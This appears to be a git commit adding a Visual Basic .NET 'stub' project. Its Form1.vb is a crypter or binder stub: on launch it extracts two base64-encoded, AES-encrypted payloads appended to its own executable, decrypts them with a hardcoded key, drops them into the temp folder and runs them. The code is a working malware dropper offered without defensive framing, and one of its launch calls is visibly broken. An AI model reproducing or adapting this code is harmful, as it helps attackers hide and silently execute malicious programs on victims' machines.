d0e293f79aaeb4286956f68c9facc7b961a6e5da
roast247 <77567356+roast247@users.noreply.github.com>
2021-03-03 14:07:55 -0800

    Add files via upload

---
+++ stub/Form1.vb
@@ -0,0 +1,25 @@
+﻿Public Class Form1
+
+    Function Unsecure(ByVal data As Byte()) As Byte()
+
+        Using SA As New System.Security.Cryptography.RijndaelManaged
+            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
+            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
+            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
+        End Using
+    End Function
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim TempDir As String = My.Computer.FileSystem.SpecialDirectories.Temp
+        Dim drop() As String = Split(System.IO.File.ReadAllText(Application.ExecutablePath), "[SPLITTER]")
+
+        Dim file1 As Byte() = Unsecure(Convert.FromBase64String(drop(1)))
+        Dim file2 As Byte() = Unsecure(Convert.FromBase64String(drop(3)))
+
+        My.Computer.FileSystem.WriteAllBytes(TempDir & "\" & drop(2), file1, False)
+        My.Computer.FileSystem.WriteAllBytes(TempDir & "\" & drop(4), file2, False)
+
+        Process.Start(TempDir & "\" & drop(2)) : Process.Start(TempDir & "\" & drop(1))
+
+    End Sub
+End Class
---
+++ stub/My Project/AssemblyInfo.vb
@@ -0,0 +1,35 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' General Information about an assembly is controlled through the following
+' set of attributes. Change these attribute values to modify the information
+' associated with an assembly.
+
+' Review the values of the assembly attributes
+
+<Assembly: AssemblyTitle("stub")>
+<Assembly: AssemblyDescription("")>
+<Assembly: AssemblyCompany("")>
+<Assembly: AssemblyProduct("stub")>
+<Assembly: AssemblyCopyright("Copyright ©  2021")>
+<Assembly: AssemblyTrademark("")>
+
+<Assembly: ComVisible(False)>
+
+'The following GUID is for the ID of the typelib if this project is exposed to COM
+<Assembly: Guid("91086ac4-374d-473f-81b2-f04237a26c9d")>
+
+' Version information for an assembly consists of the following four values:
+'
+'      Major Version
+'      Minor Version
+'      Build Number
+'      Revision
+'
+' You can specify all the values or you can default the Build and Revision Numbers
+' by using the '*' as shown below:
+' <Assembly: AssemblyVersion("1.0.*")>
+
+<Assembly: AssemblyVersion("1.0.0.0")>
+<Assembly: AssemblyFileVersion("1.0.0.0")>
